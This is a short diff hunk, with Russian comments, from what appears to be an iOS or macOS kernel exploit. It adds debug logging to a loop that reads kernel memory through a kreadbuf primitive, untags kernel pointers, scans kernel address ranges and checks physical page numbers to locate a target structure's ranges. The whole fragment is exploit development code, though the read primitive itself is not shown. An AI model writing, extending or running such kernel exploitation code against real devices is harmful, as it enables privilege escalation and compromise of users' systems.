@@ -5860,6 +5860,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 ro = kp_untag_ptr(ro);
                 if (ro < 0xffffffdc00000000ULL || ro >= 0xffffffe400000000ULL) continue;
                 if (!kreadbuf(ro + 0x18, &rq, 8)) continue;
+                // 1.9.131: печатаем САМО значение ro+0x18 (не только матч) —
+                // раунд 20: ranges могут хранить DVA>>14, не PA>>14 — тогда
+                // верификация по PA закономерно даёт ноль. Видим кодировку.
+                if (i == 0 && rangesVA == 0) {
+                    kpNote(r, [NSString stringWithFormat:@"    кандидат entry[0]+%#x: S=%#llx ro+0x18=%#018llx (pfn32 PA=%#x)", eo,
+                              (unsigned long long)S, (unsigned long long)rq, pfn32]);
+                }
                 if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
                 surfVA = S;
                 rangesVA = ro + 0x18;
